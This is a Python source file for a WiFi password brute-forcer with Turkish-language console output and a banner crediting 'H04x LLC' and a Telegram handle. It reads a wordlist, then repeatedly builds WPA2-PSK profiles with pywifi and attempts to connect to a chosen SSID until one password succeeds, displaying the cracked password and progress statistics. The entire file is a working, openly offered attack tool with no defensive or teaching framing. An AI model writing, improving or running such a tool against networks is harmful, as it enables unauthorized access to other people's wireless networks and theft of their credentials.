import time
import pywifi
from pywifi import const
import sys

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.text import Text
from rich import box
from colorama import init, Fore, Style

init(autoreset=True)

BANNER = """                            
           000000000000000000           
       00000000000000000000000000       
    000000000              000000000    
   000000      0000000000      000000   
   000    00000000000000000000    000   
        00000000        00000000        
        0000     000000     0000        
              0000000000000             
            0000000  0000000            
                                        
                 000000                 
                  0000                      

[+] THIS PROJECT DEVELOPED BY H04x LLC.
[?] t.me/sychoticdox
"""


class WiFiBruteForcer:
    def __init__(self):
        self.console = Console()
        self.found = False
        self.found_password = ""
        self.total_checked = 0
        self.start_time = None

    def _get_wifi_interfaces(self):
        try:
            wifi = pywifi.PyWiFi()
            interfaces = wifi.interfaces()
            if not interfaces:
                self.console.print(Panel("[red][-] Hiç WiFi arayüzü bulunamadı![/red]",
                                         border_style="red", title="[!] HATA", width=50))
                sys.exit(1)
            return wifi, interfaces[0]
        except Exception as e:
            self.console.print(Panel(f"[red][-] Arayüz hatası: {e}[/red]",
                                     border_style="red", title="[!] HATA", width=50))
            sys.exit(1)

    def _create_profile(self, ssid, password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        return profile

    def connect_to_wifi(self, ssid, password):
        wifi, iface = self._get_wifi_interfaces()
        iface.disconnect()
        time.sleep(0.5)
        iface.remove_all_network_profiles()

        profile = self._create_profile(ssid, password)
        iface.add_network_profile(profile)
        iface.connect(profile)

        for _ in range(8):
            status = iface.status()
            if status == const.IFACE_CONNECTED:
                return True
            time.sleep(0.3)
        return False

    def _display_stats(self, password, elapsed):
        stats_table = Table(box=box.DOUBLE, title="[bold cyan][>] İSTATİSTİKLER[/bold cyan]",
                            title_style="bold cyan", header_style="bold magenta", border_style="cyan", width=60)
        stats_table.add_column("METRİK", style="bright_yellow", justify="right")
        stats_table.add_column("DEĞER", style="green", justify="left")
        stats_table.add_row("[+] ŞİFRE", f"[bold green]{password}[/bold green]")
        stats_table.add_row("[+] GEÇEN SÜRE", f"{elapsed:.2f} saniye")
        stats_table.add_row("[+] DENENEN", f"{self.total_checked}")
        self.console.print(Panel(stats_table, border_style="green", width=65))

    def _display_not_found(self, elapsed):
        table = Table(box=box.DOUBLE, title="[bold red][-] SONUÇ[/bold red]",
                      title_style="bold red", border_style="red", width=50)
        table.add_column("METRİK", style="bright_yellow", justify="right")
        table.add_column("DEĞER", style="yellow", justify="left")
        table.add_row("[+] DENENEN ŞİFRE", f"{self.total_checked}")
        table.add_row("[+] GEÇEN SÜRE", f"{elapsed:.2f} saniye")
        self.console.print(Panel(table, border_style="red", width=55))

    def run(self, ssid, wordlist_path):
        self.console.print(BANNER)
        self.console.print(Panel(
            Text(f"SSID: {ssid}\nWORDLIST: {wordlist_path}"),
            border_style="blue",
            title="[>] TARAMA BİLGİLERİ",
            width=60
        ))
        self.console.print()

        try:
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.console.print(Panel(f"[red][-] Dosya bulunamadı: {wordlist_path}[/red]",
                                     border_style="red", title="[!] HATA", width=50))
            return
        except Exception as e:
            self.console.print(Panel(f"[red][-] Dosya okuma hatası: {e}[/red]",
                                     border_style="red", title="[!] HATA", width=50))
            return

        total = len(passwords)
        self.console.print(f"[cyan][>] Toplam {total} şifre yüklendi.[/cyan]")
        self.console.print()

        self.start_time = time.time()
        self.found = False
        self.total_checked = 0

        with Live(
            self._get_progress_table(passwords[0] if passwords else "Bekleniyor...", 0, 0),
            refresh_per_second=4,
            auto_refresh=True
        ) as live:
            for i, password in enumerate(passwords):
                if self.found:
                    break

                self.total_checked = i + 1
                elapsed = time.time() - self.start_time

                result = self.connect_to_wifi(ssid, password)

                if result:
                    self.found = True
                    self.found_password = password
                    final_elapsed = time.time() - self.start_time
                    self._display_stats(password, final_elapsed)
                    self.console.print()
                    self.console.print(Panel(
                        Text(f"[bold green][>] TEBRİKLER! ŞİFRE BULUNDU:[/bold green] [bold green]{password}[/bold green]"),
                        border_style="green",
                        title="[+] BAĞLANTI BAŞARILI!",
                        subtitle=Text(f"[>] Toplam süre: {final_elapsed:.2f}sn | Denenen: {self.total_checked}"),
                        width=65
                    ))
                    break

                rate = self.total_checked / elapsed if elapsed > 0 else 0
                remaining = (total - self.total_checked) / rate if rate > 0 else 0
                live.update(self._get_progress_table(
                    password, i + 1, total, elapsed, rate, remaining
                ))

        if not self.found:
            final_elapsed = time.time() - self.start_time
            self._display_not_found(final_elapsed)

        self.console.print()
        self.console.print(Panel(
            Text("[>] Kod tamamlandı."),
            border_style="dim",
            width=60
        ))
        sys.exit(0)

    def _get_progress_table(self, current_pw, checked, total, elapsed=0, rate=0, remaining=0):
        table = Table(box=box.SIMPLE, width=70)
        table.add_column("DURUM", style="cyan", justify="center", width=12)
        table.add_column("ŞİFRE", style="yellow", justify="left", width=22)
        table.add_column("İLERLEME", style="green", justify="right", width=10)

        progress_pct = (checked / total * 100) if total > 0 else 0
        bar = "█" * int(progress_pct / 5) + "░" * (20 - int(progress_pct / 5))

        table.add_row(
            f"[bold green]{checked}/{total}[/bold green]",
            f"[dim]{current_pw[:20]}{'...' if len(current_pw) > 20 else ''}[/dim]",
            f"[dim]{bar}[/dim] {progress_pct:.1f}%"
        )

        table.add_row()
        table.add_row("[+] SÜRE", f"{elapsed:.1f}s", f"[>] {rate:.1f}/sn")
        table.add_row("[?] KALAN", "—", f"~{remaining:.0f}s")

        return table


if __name__ == "__main__":
    print(Fore.CYAN + BANNER + Style.RESET_ALL)
    ssid = input("[>] SSID ismini girin: ")
    wordlist = input("[>] Wordlist dosya yolu: ")

    if not ssid:
        print(Fore.RED + "  [-] SSID boş bırakılamaz!" + Style.RESET_ALL)
        sys.exit(1)

    forcer = WiFiBruteForcer()
    forcer.run(ssid, wordlist)
